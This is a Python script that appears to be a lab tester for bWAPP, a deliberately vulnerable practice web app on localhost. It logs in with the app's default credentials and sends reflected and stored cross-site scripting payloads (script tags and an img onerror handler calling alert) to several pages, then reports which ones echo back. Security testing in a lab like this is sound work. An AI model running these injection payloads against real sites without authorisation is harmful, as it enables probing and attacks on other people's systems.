import requests

# bWAPP URL and credentials
bwapp_url = "http://localhost/bWAPP"
login_url = f"{bwapp_url}/login.php"
default_username = "bee"
default_password = "bug"

# Function to format vulnerability information
def format_vulnerability(vuln_type, description, details):
    return f"Vulnerability Type: {vuln_type}\nDescription: {description}\nDetails: {details}\n" + ("-" * 80) + "\n"

# Function to perform Reflected XSS Test
def test_reflected_xss():
    session = requests.Session()
    output = ""

    # Log in to bWAPP
    login_data = {"login": default_username, "password": default_password, "form": "submit"}
    session.post(login_url, data=login_data)

    # Define reflected XSS payloads
    reflected_xss_payloads = [
        ("firstname", "<script>alert('XSS1')</script>"),
        ("firstname", "<img src='x' onerror='alert(\"XSS2\")'>")
    ]

    # URLs to test
    reflected_xss_urls = [
        f"{bwapp_url}/xss_get.php",   # The first reflected XSS test uses GET
        f"{bwapp_url}/xss_post.php"   # The second reflected XSS test uses POST
    ]

    # First reflected XSS test using GET
    response = session.get(reflected_xss_urls[0], params={
        reflected_xss_payloads[0][0]: reflected_xss_payloads[0][1],
        "lastname": "Doe"
    })

    if reflected_xss_payloads[0][1] in response.text:
        output += format_vulnerability("Reflected XSS", reflected_xss_payloads[0][0], reflected_xss_payloads[0][1])
    else:
        output += "No vulnerability detected in Reflected XSS Test 1.\n"

    # Second reflected XSS test using POST
    response = session.post(reflected_xss_urls[1], data={
        reflected_xss_payloads[1][0]: reflected_xss_payloads[1][1],
        "lastname": "Doe"
    })

    if reflected_xss_payloads[1][1] in response.text:
        output += format_vulnerability("Reflected XSS", reflected_xss_payloads[1][0], reflected_xss_payloads[1][1])
    else:
        output += "No vulnerability detected in Reflected XSS Test 2.\n"

    return output

# Function to perform Stored XSS Test
def test_stored_xss():
    session = requests.Session()
    output = ""

    # Log in to bWAPP
    login_data = {"login": default_username, "password": default_password, "form": "submit"}
    session.post(login_url, data=login_data)

    # Define stored XSS payload
    stored_xss_payload = "<script>alert('XSS3')</script>"
    stored_xss_data = {
        "entry": stored_xss_payload,
        "entry_add": "on",
        "blog": "submit"
    }

    # Test Stored XSS
    response = session.post(f"{bwapp_url}/xss_stored_1.php", data=stored_xss_data)

    # Retrieve the blog page to see if the payload is stored and reflected
    response = session.get(f"{bwapp_url}/xss_stored_1.php")
    if stored_xss_payload in response.text:
        output += format_vulnerability("Stored XSS", "Stored XSS detected in blog entry.", f"Payload: {stored_xss_payload}")
    else:
        output += "No vulnerability detected in Stored XSS Test.\n"

    return output

# Function to run all XSS tests
def run_xss_tests():
    output = ""

    try:
        # Run Reflected XSS Test
        output += "=== Reflected XSS Test ===\n"
        output += test_reflected_xss()
        output += "\n"

        # Run Stored XSS Test
        output += "=== Stored XSS Test ===\n"
        output += test_stored_xss()
        output += "\n"

    except Exception as e:
        output = f"An error occurred while running the XSS tests: {e}"

    return output

if __name__ == "__main__":
    print(run_xss_tests())
